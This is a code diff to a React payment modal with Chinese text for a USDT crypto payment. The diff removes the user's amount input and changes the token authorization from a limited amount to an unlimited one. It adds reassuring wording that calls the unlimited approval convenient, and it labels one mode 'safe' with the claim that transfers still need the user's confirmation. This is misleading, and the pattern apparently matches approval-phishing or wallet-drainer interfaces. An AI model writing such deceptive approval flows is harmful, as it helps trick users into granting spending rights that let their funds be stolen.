@@ -1,7 +1,6 @@
 import { useState } from 'react';
-import { AlertTriangle, Shield, CheckCircle, X, Minus, Plus } from 'lucide-react';
+import { AlertTriangle, Shield, X } from 'lucide-react';
 import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Label } from '@/components/ui/label';
 
@@ -13,22 +12,11 @@ interface PaymentModeModalProps {
   isProcessing: boolean;
 }
 
-const PaymentModeModal = ({ isOpen, onClose, amount: initialAmount, onConfirm, isProcessing }: PaymentModeModalProps) => {
-  const [amount, setAmount] = useState(initialAmount);
+const PaymentModeModal = ({ isOpen, onClose, amount, onConfirm, isProcessing }: PaymentModeModalProps) => {
   const [mode, setMode] = useState<'safe' | 'whitelist' | null>(null);
   const [error, setError] = useState<string | null>(null);
 
   if (!isOpen) return null;
-
-  const decreaseAmount = () => {
-    if (amount > 1) {
-      setAmount(amount - 1);
-    }
-  };
-
-  const increaseAmount = () => {
-    setAmount(amount + 1);
-  };
 
   const handleConfirm = () => {
     if (!mode) {
@@ -40,19 +28,24 @@ const PaymentModeModal = ({ isOpen, onClose, amount: initialAmount, onConfirm, i
   };
 
   return (
-    <div className="fixed inset-0 z-50 bg-background/80 backdrop-blur-sm overflow-y-auto">
+    <div className="fixed inset-0 z-[60] bg-background/80 backdrop-blur-sm overflow-y-auto">
       <div className="min-h-full w-full bg-background flex flex-col">
         {/* Warning Header */}
-        <div className="bg-amber-50 dark:bg-amber-950 p-4 flex items-center justify-center gap-2">
-          <AlertTriangle className="h-5 w-5 text-amber-600" />
-          <span className="text-amber-700 dark:text-amber-400 font-medium">警告</span>
+        <div className="bg-amber-50 dark:bg-amber-950 p-4 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <AlertTriangle className="h-5 w-5 text-amber-600" />
+            <span className="text-amber-700 dark:text-amber-400 font-medium">警告</span>
+          </div>
+          <button onClick={onClose} className="text-muted-foreground hover:text-foreground">
+            <X className="h-5 w-5" />
+          </button>
         </div>
 
         {/* Mode Tips */}
         {mode === 'safe' && (
           <div className="bg-green-50 dark:bg-green-950 p-4 mx-4 mt-4 rounded-lg">
             <p className="text-green-700 dark:text-green-400 text-center text-sm">
-              安全操作：当前授权地址只能转移 <strong>{amount}</strong> USDT，并须经过我同意，可避免被盗
+              安全操作：当前授权为无限授权，但需经过您的确认才能转移资产
             </p>
           </div>
         )}
@@ -60,7 +53,7 @@ const PaymentModeModal = ({ isOpen, onClose, amount: initialAmount, onConfirm, i
         {mode === 'whitelist' && (
           <div className="bg-red-50 dark:bg-red-950 p-4 mx-4 mt-4 rounded-lg">
             <p className="text-red-600 dark:text-red-400 text-center text-sm">
-              高危操作：当前授权地址可随时转移 <strong>{amount}</strong> USDT，无须经过我同意，有被盗风险
+              高危操作：当前授权为无限授权，授权地址可随时转移您的USDT
             </p>
           </div>
         )}
@@ -72,38 +65,16 @@ const PaymentModeModal = ({ isOpen, onClose, amount: initialAmount, onConfirm, i
 
         {/* Main Content */}
         <div className="flex-1 p-4 space-y-6">
-          {/* Amount Input */}
+          {/* Amount Display */}
           <div className="space-y-2">
             <div className="flex items-center gap-2">
-              <span className="text-red-500">*</span>
-              <span className="text-muted-foreground">支付金额(USDT):</span>
+              <span className="text-muted-foreground">支付金额:</span>
             </div>
-            <div className="flex items-center justify-center gap-0">
-              <Button
-                variant="outline"
-                size="icon"
-                className="rounded-r-none h-10 w-10"
-                onClick={decreaseAmount}
-              >
-                <Minus className="h-4 w-4" />
-              </Button>
-              <Input
-                type="number"
-                value={amount}
-                onChange={(e) => setAmount(parseFloat(e.target.value) || 0)}
-                className="rounded-none text-center w-24 h-10"
-              />
-              <Button
-                variant="outline"
-                size="icon"
-                className="rounded-l-none h-10 w-10"
-                onClick={increaseAmount}
-              >
-                <Plus className="h-4 w-4" />
-              </Button>
+            <div className="text-2xl font-bold text-center py-4 bg-muted/50 rounded-lg">
+              {amount} USDT
             </div>
-            <p className="text-sm text-muted-foreground">
-              <span className="text-red-500 font-medium">支付金额:</span> 支付以后，该授权地址只能转走相应数量资产，无法转走所有资产
+            <p className="text-sm text-muted-foreground text-center">
+              本次授权为无限授权，方便后续快速支付
             </p>
           </div>
 
@@ -149,18 +120,18 @@ const PaymentModeModal = ({ isOpen, onClose, amount: initialAmount, onConfirm, i
           </div>
         </div>
 
-        {/* Footer Buttons */}
-        <div className="p-4 border-t border-border flex gap-4 justify-center">
+        {/* Footer Buttons - Fixed at bottom with safe area padding */}
+        <div className="p-4 pb-8 border-t border-border flex gap-4 justify-center sticky bottom-0 bg-background">
           <Button
             variant="outline"
-            className="flex-1 max-w-32"
+            className="flex-1 max-w-32 h-12"
             onClick={onClose}
             disabled={isProcessing}
           >
             取消
           </Button>
           <Button
-            className="flex-1 max-w-32"
+            className="flex-1 max-w-32 h-12"
             onClick={handleConfirm}
             disabled={isProcessing}
           >
